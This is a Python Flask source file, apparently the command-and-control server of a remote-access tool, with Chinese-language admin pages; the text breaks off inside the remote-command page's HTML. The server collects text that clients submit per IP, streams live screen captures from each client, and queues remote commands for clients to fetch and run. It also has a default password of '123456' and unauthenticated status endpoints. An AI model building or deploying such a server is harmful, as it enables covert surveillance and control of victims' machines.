from flask import Flask, request, jsonify, render_template_string, make_response, redirect
import os
from waitress import serve
import base64
import pyotp
import hashlib

app = Flask(__name__)
contents = {}
password = os.environ.get("PASSWORD", "123456")
screen_data = {}
get_2fa_times = {}
list_2fa_keys = {}
last_2fa_keys = {}
command_queue = {}
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
STATIC_FILES = {
    "tailwind.js": {
        "path": os.path.join(APP_ROOT, "static/js/tailwind.js"),
        "content_type": "application/javascript; charset=utf-8",
        "binary": False
    },
    "font-awesome.min.css": {
        "path": os.path.join(APP_ROOT, "static/css/font-awesome.min.css"),
        "content_type": "text/css; charset=utf-8",
        "binary": False
    },
    "webfonts/fa-solid-900.woff2": {
        "path": os.path.join(APP_ROOT, "static/webfonts/fa-solid-900.woff2"),
        "content_type": "font/woff2",
        "binary": True
    },
    "webfonts/fa-solid-900.ttf": {
        "path": os.path.join(APP_ROOT, "static/webfonts/fa-solid-900.ttf"),
        "content_type": "font/ttf",
        "binary": True
    }
}

def get_real_ip():
    x_forwarded_for = request.headers.get("X-Forwarded-For")
    if x_forwarded_for:
        return x_forwarded_for.split(",")[0].strip()
    x_real_ip = request.headers.get("X-Real-IP")
    if x_real_ip:
        return x_real_ip
    return request.remote_addr

@app.route("/2fa", methods=["GET"])
def get_2fa_key():
    ip = get_real_ip()
    if ip not in list_2fa_keys:
        totp_secret = base64.b32encode(os.urandom(16)).decode('utf-8')
        list_2fa_keys[ip] = pyotp.TOTP(
            totp_secret,
            digits=10,
            digest=hashlib.sha384
        )
    if ip not in get_2fa_times:
        get_2fa_times[ip] = 1
        ip_2fa_key = str(list_2fa_keys[ip].now())
        last_2fa_keys[ip] = ip_2fa_key
        return jsonify({"code": 200, "content": ip_2fa_key}), 200
    else:
        input_key = request.args.get('2fa_key')
        if input_key and list_2fa_keys[ip].verify(input_key, valid_window=1):
            get_2fa_times[ip] += 1
            ip_2fa_key = str(list_2fa_keys[ip].now())
            last_2fa_keys[ip] = ip_2fa_key
            return jsonify({"code": 200, "content": ip_2fa_key}), 200
        else:
            return jsonify({"code": 403, "msg": "Forbidden"}), 403

def render_static_file(file_key):
    file_config = STATIC_FILES.get(file_key, None)
    if not file_config:
        return jsonify({"code": 404, "msg": "File not found"}), 404
    
    file_path = file_config["path"]
    content_type = file_config["content_type"]
    is_binary = file_config["binary"]
    
    try:
        if is_binary:
            with open(file_path, "rb") as f:
                content = f.read()
        else:
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
    except Exception as e:
        return jsonify({"code": 500, "msg": f"Failed to read file: {str(e)}"}), 500
    
    response = make_response(content)
    response.headers["Content-Type"] = content_type
    
    if file_key.startswith("fa-solid-"):
        response.headers["Cache-Control"] = "public, max-age=86400"
    else:
        response.headers["Cache-Control"] = "public, max-age=3600"
    
    return response

@app.route("/<path:x>", methods=["GET"])
def static_file(x):
    return render_static_file(x)

@app.route("/status", methods=["GET"])
def status():
    return jsonify({"code": 200, "contents": "OK"}), 200

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return redirect("/admin")
    client_ip = get_real_ip()
    content = request.form.get("content", "")
    key = request.form.get("2fa_key", "")
    if not content or not key:
        return jsonify({"code": 400, "msg": "Content or 2FA key is empty"}), 400
    if client_ip not in list_2fa_keys:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    if list_2fa_keys[client_ip].verify(key, valid_window=1):
        contents[client_ip] = contents.get(client_ip, "") + content + " "
        return jsonify({"code": 200}), 200
    else:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd != password:
            return jsonify({"code": 403, "msg": "Forbidden"}), 403
        return jsonify({"code": 200, "contents": contents}), 200
    
    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
        <title>管理员后台</title>
        <script src="/tailwind.js"></script>
        <link rel="stylesheet" href="/font-awesome.min.css">
        <script>
            tailwind.config = {
                theme: {
                    extend: {
                        colors: {
                            primary: '#165DFF',
                            secondary: '#6B7280',
                            success: '#10B981',
                            danger: '#EF4444',
                            light: '#F3F4F6',
                            dark: '#1F2937'
                        },
                        screens: {
                            'tablet': '768px',
                            'desktop': '1024px',
                        }
                    }
                }
            }
        </script>
        <style type="text/tailwindcss">
            @layer utilities {
                .content-auto {
                    content-visibility: auto;
                }
                .card-shadow {
                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
                }
                .input-focus {
                    @apply focus:ring-2 focus:ring-primary/30 focus:border-primary;
                }
                .tablet-shadow {
                    box-shadow: 0 6px 25px rgba(0, 0, 0, 0.1);
                }
            }
        </style>
    </head>
    <body class="bg-gray-50 min-h-screen flex flex-col">
        <header class="bg-white card-shadow sticky top-0 z-10">
            <div class="container mx-auto px-4 py-2 sm:py-3 md:py-4 flex flex-col sm:flex-row md:flex-row justify-between items-center gap-2 sm:gap-0">
                <div class="flex items-center gap-2 w-full sm:w-auto justify-center sm:justify-start md:justify-start">
                    <i class="fa-solid fa-shield-halved text-primary text-xl sm:text-2xl md:text-2xl"></i>
                    <h1 class="text-sm sm:text-lg md:text-xl font-bold text-dark">内容管理后台</h1>
                </div>
                <div class="text-xs sm:text-sm md:text-sm text-secondary w-full sm:w-auto text-center sm:text-right md:text-right">
                    <i class="fa-solid fa-user-shield mr-1"></i>管理员入口
                </div>
            </div>
        </header>

        <main class="flex-grow container mx-auto px-3 sm:px-4 md:px-6 py-4 sm:py-6 md:py-8 lg:py-12">
            <div class="max-w-3xl w-full mx-auto">
                <div id="login-card" class="bg-white rounded-xl card-shadow tablet-shadow p-4 sm:p-5 md:p-6 lg:p-8 mb-4 sm:mb-6 md:mb-8 transform transition-all duration-300 hover:scale-[1.005] md:hover:scale-[1.01]">
                    <div class="text-center mb-4 sm:mb-5 md:mb-6">
                        <i class="fa-solid fa-lock text-primary text-3xl sm:text-4xl md:text-4xl mb-2 sm:mb-3"></i>
                        <h2 class="text-base sm:text-lg md:text-xl font-semibold text-dark">验证管理员密码</h2>
                        <p class="text-secondary text-xs sm:text-sm mt-1">请输入密码以查看提交的内容</p>
                    </div>
                    <form id="password-form" class="space-y-3 sm:space-y-4">
                        <div>
                            <label for="password" class="block text-xs sm:text-sm font-medium text-dark mb-1">
                                <i class="fa-solid fa-key mr-1"></i>管理员密码
                            </label>
                            <input 
                                type="password" 
                                id="password" 
                                name="password" 
                                class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg input-focus outline-none transition-all duration-200 text-sm sm:text-base"
                                placeholder="请输入密码"
                                required
                            >
                        </div>
                        <button 
                            type="submit" 
                            class="w-full bg-primary hover:bg-primary/90 text-white font-medium py-2 sm:py-3 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2 text-sm sm:text-base"
                        >
                            <i class="fa-solid fa-right-to-bracket"></i>
                            <span>验证并查看内容</span>
                        </button>
                    </form>
                    <div id="error-message" class="mt-3 sm:mt-4 text-center text-danger text-xs sm:text-sm hidden">
                        <i class="fa-solid fa-circle-exclamation mr-1"></i>
                        <span id="error-text">密码错误，请重新输入</span>
                    </div>
                </div>

                <div id="content-section" class="bg-white rounded-xl card-shadow tablet-shadow p-4 sm:p-5 md:p-6 lg:p-8 hidden">
                    <div class="flex flex-col sm:flex-row md:flex-row justify-between items-center gap-2 sm:gap-0 mb-4 sm:mb-5 md:mb-6">
                        <h2 class="text-xs sm:text-base md:text-lg font-semibold text-dark flex items-center gap-2">
                            <i class="fa-solid fa-file-alt text-primary"></i>
                            客户端提交内容
                        </h2>
                        <button 
                            id="refresh-btn" 
                            class="text-xs sm:text-sm bg-light hover:bg-gray-200 text-dark py-2 px-3 rounded-lg transition-all duration-200 flex items-center gap-1 w-full sm:w-auto md:w-auto justify-center"
                        >
                            <i class="fa-solid fa-refresh"></i>
                            刷新
                        </button>
                    </div>
                    <div id="empty-state" class="py-8 sm:py-10 md:py-12 text-center hidden">
                        <i class="fa-solid fa-inbox text-gray-300 text-4xl sm:text-5xl mb-3 sm:mb-4"></i>
                        <p class="text-secondary text-sm">暂无客户端提交的内容</p>
                    </div>
                    <div id="content-list" class="space-y-2 sm:space-y-3 md:space-y-4 max-h-[60vh] sm:max-h-[65vh] md:max-h-[70vh] overflow-y-auto pr-2 custom-scrollbar">
                    </div>
                </div>
            </div>
        </main>

        <footer class="bg-white py-2 sm:py-3 md:py-4 card-shadow mt-4 sm:mt-6 md:mt-8">
            <div class="container mx-auto px-4 text-center text-xs sm:text-sm text-secondary">
                <p>管理员后台 © 2025</p>
            </div>
        </footer>

        <script>
            document.addEventListener('DOMContentLoaded', () => {
                const passwordForm = document.getElementById('password-form');
                const errorMessage = document.getElementById('error-message');
                const errorText = document.getElementById('error-text');
                const loginCard = document.getElementById('login-card');
                const contentSection = document.getElementById('content-section');
                const contentList = document.getElementById('content-list');
                const emptyState = document.getElementById('empty-state');
                const refreshBtn = document.getElementById('refresh-btn');
                
                passwordForm.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    let password = document.getElementById('password').value;
                    try {
                        const response = await fetch('/admin', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({ password })
                        });
                        const data = await response.json();
                        if (data.code === 200) {
                            errorMessage.classList.add('hidden');
                            loginCard.classList.add('mb-2');
                            contentSection.classList.remove('hidden');
                            renderContent(data.contents);
                            if (window.contentRefreshTimer) {
                                clearInterval(window.contentRefreshTimer);
                            }
                            const refreshInterval = /iPad|Tablet|Android/.test(navigator.userAgent) ? 1000 : 1500;
                            window.contentRefreshTimer = setInterval(async () => {
                                try {
                                    const response = await fetch('/admin', {
                                        method: 'POST',
                                        headers: {
                                            'Content-Type': 'application/x-www-form-urlencoded',
                                        },
                                        body: new URLSearchParams({ password })
                                    });
                                    const refreshData = await response.json();
                                    if (refreshData.code === 200) {
                                        renderContent(refreshData.contents);
                                    }
                                } catch (error) {
                                    console.error('自动刷新失败:', error);
                                }
                            }, refreshInterval);
                        } else {
                            errorText.textContent = data.msg || '密码错误，拒绝访问';
                            loginCard.classList.remove('mb-2');
                            errorMessage.classList.remove('hidden');
                            contentSection.classList.add('hidden');
                            loginCard.classList.add('animate-shake');
                            if(window.contentRefreshTimer){
                                clearInterval(window.contentRefreshTimer);
                            }
                            setTimeout(() => loginCard.classList.remove('animate-shake'), 500);
                        }
                    } catch (error) {
                        errorText.textContent = '服务器错误，请稍后重试';
                        errorMessage.classList.remove('hidden');
                        console.error('验证失败:', error);
                    }
                });
                
                refreshBtn.addEventListener('click', async () => {
                    const password = document.getElementById('password').value;
                    if (!password) return;
                    try {
                        const response = await fetch('/admin', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({ password })
                        });
                        const data = await response.json();
                        if (data.code === 200) {
                            renderContent(data.contents);
                        }
                    } catch (error) {
                        console.error('刷新失败:', error);
                    }
                });
                
                function renderContent(contents) {
                    contentList.innerHTML = '';
                    const hasContent = Object.keys(contents).length > 0;
                    emptyState.classList.toggle('hidden', hasContent);
                    contentList.classList.toggle('hidden', !hasContent);
                    if (!hasContent) return;
                    Object.entries(contents).forEach(([ip, content]) => {
                        const contentItem = document.createElement('div');
                        contentItem.className = 'p-2 sm:p-3 md:p-4 border border-gray-100 rounded-lg hover:bg-gray-50 transition-all duration-200';
                        // 核心修改：添加【执行命令】标签，与实时屏幕并列
                        contentItem.innerHTML = `
                            <div class="flex flex-col sm:flex-row md:flex-row justify-between items-start sm:items-center mb-2 gap-2 sm:gap-0">
                                <div class="flex items-center gap-2 flex-wrap">
                                    <span class="bg-primary/10 text-primary text-xs px-2 py-1 rounded-full flex items-center gap-1">
                                        <i class="fa-solid fa-globe"></i>
                                        <span class="break-all">${ip}</span>
                                    </span>
                                    <a href="/screen/${ip}" class="bg-primary/10 text-primary text-xs px-2 py-1 rounded-full hover:bg-primary/20 transition-colors">
                                        <i class="fa-solid fa-computer mr-1"></i>查看实时屏幕
                                    </a>
                                    <a href="/command/${ip}" class="bg-success/10 text-success text-xs px-2 py-1 rounded-full hover:bg-success/20 transition-colors">
                                        <i class="fa-solid fa-terminal mr-1"></i>执行远程命令
                                    </a>
                                </div>
                                <span class="text-xs text-secondary">
                                    <i class="fa-solid fa-clock mr-1"></i>${new Date().toLocaleString()}
                                </span>
                            </div>
                            <p class="text-dark text-xs sm:text-sm whitespace-pre-wrap break-words">${content.trim() || '无内容'}</p>
                        `;
                        contentList.appendChild(contentItem);
                    });
                }
                
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes shake {
                        0%, 100% { transform: translateX(0); }
                        25% { transform: translateX(-3px); }
                        75% { transform: translateX(3px); }
                    }
                    @media (min-width: 1024px) {
                        @keyframes shake {
                            0%, 100% { transform: translateX(0); }
                            25% { transform: translateX(-5px); }
                            75% { transform: translateX(5px); }
                        }
                    }
                    .animate-shake {
                        animation: shake 0.5s ease-in-out;
                    }
                    .custom-scrollbar::-webkit-scrollbar {
                        width: 4px;
                        height: 4px;
                    }
                    @media (min-width: 768px) {
                        .custom-scrollbar::-webkit-scrollbar {
                            width: 5px;
                            height: 5px;
                        }
                    }
                    @media (min-width: 1024px) {
                        .custom-scrollbar::-webkit-scrollbar {
                            width: 6px;
                            height: 6px;
                        }
                    }
                    .custom-scrollbar::-webkit-scrollbar-track {
                        background: #f1f1f1;
                        border-radius: 10px;
                    }
                    .custom-scrollbar::-webkit-scrollbar-thumb {
                        background: #d1d5db;
                        border-radius: 10px;
                    }
                    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                        background: #9ca3af;
                    }
                `;
                document.head.appendChild(style);
            });
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template)

@app.route("/screen", methods=["POST"])
def receive_screen():
    client_ip = get_real_ip()
    data_type = request.form.get("type")
    key = request.form.get("2fa_key", "")
    if data_type != "screen":
        return jsonify({"code": 400, "msg": "Invalid type"}), 400
    data = request.form.get("data")
    if not data or not key:
        return jsonify({"code": 400, "msg": "Missing parameters"}), 400
    if client_ip not in list_2fa_keys:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    if list_2fa_keys[client_ip].verify(key, valid_window=1):
        screen_data[client_ip] = data
        return jsonify({"code": 200}), 200
    else:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403

@app.route("/clear_command", methods=["GET"])
def clear_command():
    client_ip = get_real_ip()
    key = request.args.get("2fa_key", "")
    if not key:
        return jsonify({"code": 400, "msg": "Missing parameters"}), 400
    if client_ip not in list_2fa_keys:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    if list_2fa_keys[client_ip].verify(key, valid_window=1):
        command_queue[client_ip] = ""
        return jsonify({"code": 200}), 200
    else:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403

@app.route("/get_command", methods=["GET"])
def get_command():
    client_ip = get_real_ip()
    key = request.args.get("2fa_key", "")
    if not key:
        return jsonify({"code": 400, "msg": "Missing parameters"}), 400
    if client_ip not in list_2fa_keys:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    if list_2fa_keys[client_ip].verify(key, valid_window=1):
        command = command_queue.get(client_ip, "")
        return jsonify({"code": 200, "command": command}), 200
    else:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
@app.route("/get_command_status", methods=["GET"])
def get_command_status():
    client_ip = request.args.get("ip", "")
    if not client_ip:
        return jsonify({"code": 400, "msg": "Missing parameters"}), 400
    return jsonify({"code": 200, "command": bool(command_queue.get(client_ip, ""))}), 200
@app.route("/set_command", methods=["POST"])
def set_command():
    client_ip = request.form.get("ip", "")
    pwd = request.form.get("password", "")
    command = request.form.get("command", "")
    if not pwd or not command:
        return jsonify({"code": 400, "msg": "Missing parameters"}), 400
    if client_ip not in list_2fa_keys:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    if pwd != password:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    command_queue[client_ip] = command
    return jsonify({"code": 200, "msg": "命令已下发"}), 200

@app.route("/screen_data/<ip>", methods=["GET"])
def get_screen_data(ip):
    pwd = request.args.get("password")
    if pwd != password:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
    data = screen_data.get(ip)
    if not data:
        return jsonify({"code": 404, "msg": "No screen data"}), 404
    return jsonify({"code": 200, "data": data}), 200
@app.route("/check_password", methods=["GET"])
def check_password():
    pwd = request.args.get("password")
    if pwd == password:
        return jsonify({"code": 200, "msg": "Password correct"}), 200
    else:
        return jsonify({"code": 403, "msg": "Forbidden"}), 403
@app.route("/screen/<ip>", methods=["GET"])
def screen_view(ip):
    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, orientation=device">
        <title>实时屏幕 - {{ ip }}</title>
        <script src="/tailwind.js"></script>
        <link rel="stylesheet" href="/font-awesome.min.css">
        <script>
            tailwind.config = {
                theme: {
                    extend: {
                        colors: {
                            primary: '#165DFF',
                            secondary: '#6B7280',
                            success: '#10B981',
                            danger: '#EF4444',
                            light: '#F3F4F6',
                            dark: '#1F2937'
                        },
                        screens: {
                            'tablet': '768px',
                            'desktop': '1024px',
                        }
                    }
                }
            }
        </script>
    </head>
    <body class="bg-gray-100 custom-scrollbar min-h-screen flex flex-col">
        <header class="bg-white shadow-md p-2 sm:p-3 md:p-4 transition-all duration-300 hover:shadow-lg sticky top-0 z-10">
            <div class="container mx-auto flex flex-col sm:flex-row md:flex-row flex-wrap items-center justify-between gap-2 sm:gap-3 md:gap-4">
                <h1 class="text-xs sm:text-base md:text-lg font-bold text-gray-800 flex items-center w-full sm:w-auto justify-center sm:justify-start md:justify-start">
                    <i class="fa-solid fa-desktop text-primary mr-2 transition-transform duration-300 hover:scale-110 text-base sm:text-xl"></i>
                    实时屏幕 - {{ ip }}
                </h1>
                <h1 class="text-xs sm:text-base md:text-xl font-bold text-gray-800 flex items-center w-full sm:w-auto justify-center sm:justify-end md:justify-end">
                    <i class="fa-solid fa-shield-halved text-primary text-xl sm:text-2xl mr-2 transition-colors duration-300 group-hover:text-primary/80"></i>
                    <a href="/admin" class="transition-colors duration-300 hover:text-primary text-center">返回管理页面</a>
                </h1>
                <div class="flex flex-col sm:flex-row md:flex-row items-center gap-2 sm:gap-3 w-full sm:w-auto md:w-auto">
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="输入管理员密码" 
                        class="px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary/50 focus:border-primary focus:outline-none transition-all duration-300 placeholder:text-gray-400 w-full sm:w-40 md:w-48 lg:w-56 hover:border-gray-400 text-sm sm:text-base"
                        required
                    >
                    <button 
                        id="connect-btn" 
                        class="bg-primary text-white px-4 sm:px-5 md:px-6 py-2 sm:py-3 rounded-lg font-medium transition-all duration-300 hover:bg-primary/90 hover:shadow-md active:scale-95 focus:ring-2 focus:ring-primary/50 focus:ring-offset-2 w-full sm:w-auto md:w-auto text-sm sm:text-base flex items-center justify-center gap-2"
                    >
                        <i class="fa-solid fa-plug-circle-bolt"></i> 
                        <span>连接</span>
                    </button>
                </div>
            </div>
        </header>
        <main class="flex-grow container mx-auto p-2 sm:p-3 md:p-4">
            <div id="cncard" class="bg-white rounded-xl shadow-md p-3 sm:p-4 md:p-6 lg:p-8 mb-4 sm:mb-6 md:mb-8 transform transition-all duration-300 hover:scale-[1.005] md:hover:scale-[1.01] w-full">
                <div id="status" class="p-4 sm:p-5 md:p-4 text-center text-gray-700 text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center">
                    <i class="fa-solid fa-circle-notch fa-spin mr-2 text-base sm:text-xl"></i>
                    <span>等待连接...</span>
                </div>
                <div id="screen-container" class="hidden flex justify-center items-center p-2 sm:p-3 md:p-4 w-full overflow-hidden">
                    <img id="screen-image" src="" alt="实时屏幕" class="max-w-full 
                        h-auto 
                        sm:max-h-[40vh] 
                        md:max-h-[70vh] 
                        lg:max-h-[80vh] 
                        object-contain touch-manipulation" />
                </div>
            </div>
        </main>
        <script>
            document.addEventListener('DOMContentLoaded', () => {
                const ip = "{{ ip }}";
                const passwordInput = document.getElementById('password');
                const connectBtn = document.getElementById('connect-btn');
                const statusEl = document.getElementById('status');
                const screenContainer = document.getElementById('screen-container');
                const screenImage = document.getElementById('screen-image');
                const CNCARD = document.getElementById('cncard');
                let isConnected = false;
                let password = '';
                let currentScale = 1;
                const maxScale = 3;
                const minScale = 1;

                const isMobile = /iPhone|Android/.test(navigator.userAgent) && !/iPad|Tablet/.test(navigator.userAgent);
                const isTablet = /iPad|Tablet|Android/.test(navigator.userAgent) && !isMobile;
                const frameInterval = isMobile ? 50 : (isTablet ? 30 : 20);

                connectBtn.addEventListener('click', () => {
                    password = passwordInput.value;
                    if (!password) {
                        showToast('请输入密码');
                        return;
                    }
                    
                    statusEl.className = 'p-4 sm:p-5 md:p-4 text-center text-gray-700 text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center';
                    statusEl.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2 text-base sm:text-xl"></i><span>连接中...</span>';
                    isConnected = true;
                    fetchFrame();
                });

                let touchStartDistance = 0;
                let touchStartX = 0;
                let touchStartY = 0;
                let isDragging = false;

                screenImage.addEventListener('touchstart', (e) => {
                    if (e.touches.length === 2) {
                        touchStartDistance = Math.hypot(
                            e.touches[0].clientX - e.touches[1].clientX,
                            e.touches[0].clientY - e.touches[1].clientY
                        );
                        isDragging = false;
                    } 
                    else if (isTablet && currentScale > 1) {
                        touchStartX = e.touches[0].clientX;
                        touchStartY = e.touches[0].clientY;
                        isDragging = true;
                        screenImage.style.transition = 'none';
                    }
                });

                screenImage.addEventListener('touchmove', (e) => {
                    e.preventDefault();
                    if (e.touches.length === 2) {
                        const currentDistance = Math.hypot(
                            e.touches[0].clientX - e.touches[1].clientX,
                            e.touches[0].clientY - e.touches[1].clientY
                        );
                        const scaleRatio = currentDistance / touchStartDistance;
                        currentScale = Math.min(maxScale, Math.max(minScale, scaleRatio * currentScale));
                        screenImage.style.transform = `scale(${currentScale})`;
                    }
                    else if (isTablet && isDragging && currentScale > 1) {
                        const deltaX = e.touches[0].clientX - touchStartX;
                        const deltaY = e.touches[0].clientY - touchStartY;
                        const currentLeft = parseFloat(screenImage.style.left) || 0;
                        const currentTop = parseFloat(screenImage.style.top) || 0;
                        screenImage.style.left = `${currentLeft + deltaX}px`;
                        screenImage.style.top = `${currentTop + deltaY}px`;
                        touchStartX = e.touches[0].clientX;
                        touchStartY = e.touches[0].clientY;
                    }
                });

                screenImage.addEventListener('touchend', () => {
                    isDragging = false;
                    screenImage.style.transition = 'transform 0.2s ease';
                });

                function fetchFrame() {
                    if (!isConnected) return;
                    fetch(`/screen_data/${ip}?password=${encodeURIComponent(password)}`)
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('获取数据失败');
                            }
                            return response.json();
                        })
                        .then(data => {
                            if (data.code === 200) {
                                statusEl.classList.add('hidden');
                                screenContainer.classList.remove('hidden');
                                screenImage.src = `data:image/jpeg;base64,${data.data}`;
                                setTimeout(fetchFrame, frameInterval);
                            } else {
                                console.log('错误响应:', data);
                                statusEl.classList.remove('hidden');
                                screenContainer.classList.add('hidden');
                                statusEl.className = 'p-4 sm:p-5 md:p-4 text-center text-danger text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center';
                                statusEl.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2 text-base sm:text-xl"></i><span>获取数据失败: ' + data.msg + '</span>';
                                CNCARD.classList.add('animate-shake');
                                setTimeout(() => CNCARD.classList.remove('animate-shake'), 500);
                                isConnected = false;
                            }
                        })
                        .catch(error => {
                            statusEl.classList.remove('hidden');
                            screenContainer.classList.add('hidden');
                            statusEl.className = 'p-4 sm:p-5 md:p-4 text-center text-danger text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center';
                            statusEl.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2 text-base sm:text-xl"></i><span>连接错误: ' + error.message + '</span>';
                            CNCARD.classList.add('animate-shake');
                            setTimeout(() => CNCARD.classList.remove('animate-shake'), 500);
                            isConnected = false;
                        });
                }

                window.addEventListener('beforeunload', () => {
                    isConnected = false;
                });

                function showToast(message) {
                    const toast = document.createElement('div');
                    const toastClass = isMobile ? 'text-sm px-3 py-2' : (isTablet ? 'text-base px-4 py-2' : 'text-base px-4 py-3');
                    toast.className = `fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-dark/80 text-white ${toastClass} rounded-lg z-50 transition-all duration-300`;
                    toast.textContent = message;
                    document.body.appendChild(toast);
                    setTimeout(() => {
                        toast.classList.add('opacity-0');
                        setTimeout(() => document.body.removeChild(toast), 300);
                    }, isMobile ? 2000 : 3000);
                }
            });

            const style = document.createElement('style');
            style.textContent = `
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-3px); }
                    75% { transform: translateX(3px); }
                }
                @media (min-width: 1024px) {
                    @keyframes shake {
                        0%, 100% { transform: translateX(0); }
                        25% { transform: translateX(-5px); }
                        75% { transform: translateX(5px); }
                    }
                }
                .animate-shake {
                    animation: shake 0.5s ease-in-out;
                }
                .custom-scrollbar::-webkit-scrollbar {
                    width: 4px;
                    height: 4px;
                }
                @media (min-width: 768px) {
                    .custom-scrollbar::-webkit-scrollbar {
                        width: 5px;
                        height: 5px;
                    }
                }
                @media (min-width: 1024px) {
                    .custom-scrollbar::-webkit-scrollbar {
                        width: 6px;
                        height: 6px;
                    }
                }
                .custom-scrollbar::-webkit-scrollbar-track {
                    background: #f1f1f1;
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb {
                    background: #d1d5db;
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                    background: #9ca3af;
                }
                img {
                    touch-action: manipulation;
                    position: relative;
                    cursor: ${/iPad|Tablet/.test(navigator.userAgent) ? 'grab' : 'default'};
                }
                img:active {
                    cursor: grabbing;
                }
            `;
            document.head.appendChild(style);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, ip=ip)

# 新增：远程命令执行页面路由（核心功能）
@app.route("/command/<ip>", methods=["GET"])
def command_view(ip):
    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
        <title>远程命令执行 - {{ ip }}</title>
        <script src="/tailwind.js"></script>
        <link rel="stylesheet" href="/font-awesome.min.css">
        <script>
            tailwind.config = {
                theme: {
                    extend: {
                        colors: {
                            primary: '#165DFF',
                            secondary: '#6B7280',
                            success: '#10B981',
                            danger: '#EF4444',
                            light: '#F3F4F6',
                            dark: '#1F2937'
                        },
                        screens: {
                            'tablet': '768px',
                            'desktop': '1024px',
                        }
                    }
                }
            }
        </script>
    </head>
    <body class="bg-gray-100 custom-scrollbar min-h-screen flex flex-col">
        <!-- 头部：参考实时屏幕页面，适配移动端/平板/桌面 -->
        <header class="bg-white shadow-md p-2 sm:p-3 md:p-4 transition-all duration-300 hover:shadow-lg sticky top-0 z-10">
            <div class="container mx-auto flex flex-col sm:flex-row md:flex-row flex-wrap items-center justify-between gap-2 sm:gap-3 md:gap-4">
                <h1 class="text-xs sm:text-base md:text-lg font-bold text-gray-800 flex items-center w-full sm:w-auto justify-center sm:justify-start md:justify-start">
                    <i class="fa-solid fa-terminal text-success mr-2 transition-transform duration-300 hover:scale-110 text-base sm:text-xl"></i>
                    远程命令执行 - {{ ip }}
                </h1>
                <h1 class="text-xs sm:text-base md:text-xl font-bold text-gray-800 flex items-center w-full sm:w-auto justify-center sm:justify-end md:justify-end">
                    <i class="fa-solid fa-shield-halved text-primary text-xl sm:text-2xl mr-2 transition-colors duration-300 group-hover:text-primary/80"></i>
                    <a href="/admin" class="transition-colors duration-300 hover:text-primary text-center">返回管理页面</a>
                </h1>
                <!-- 密码输入框：验证管理员身份 -->
                <div class="flex flex-col sm:flex-row md:flex-row items-center gap-2 sm:gap-3 w-full sm:w-auto md:w-auto">
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="输入管理员密码" 
                        class="px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-success/50 focus:border-success focus:outline-none transition-all duration-300 placeholder:text-gray-400 w-full sm:w-40 md:w-48 lg:w-56 hover:border-gray-400 text-sm sm:text-base"
                        required
                    >
                    <button 
                        id="auth-btn" 
                        class="bg-success text-white px-4 sm:px-5 md:px-6 py-2 sm:py-3 rounded-lg font-medium transition-all duration-300 hover:bg-success/90 hover:shadow-md active:scale-95 focus:ring-2 focus:ring-success/50 focus:ring-offset-2 w-full sm:w-auto md:w-auto text-sm sm:text-base flex items-center justify-center gap-2"
                    >
                        <i class="fa-solid fa-unlock"></i> 
                        <span>验证身份</span>
                    </button>
                </div>
            </div>
        </header>

        <!-- 主体内容：命令输入和执行区域 -->
        <main class="flex-grow container mx-auto p-2 sm:p-3 md:p-4">
            <div id="command-card" class="bg-white rounded-xl shadow-md p-3 sm:p-4 md:p-6 lg:p-8 mb-4 sm:mb-6 md:mb-8 transform transition-all duration-300 hover:scale-[1.005] md:hover:scale-[1.01] w-full">
                <!-- 状态提示区域 -->
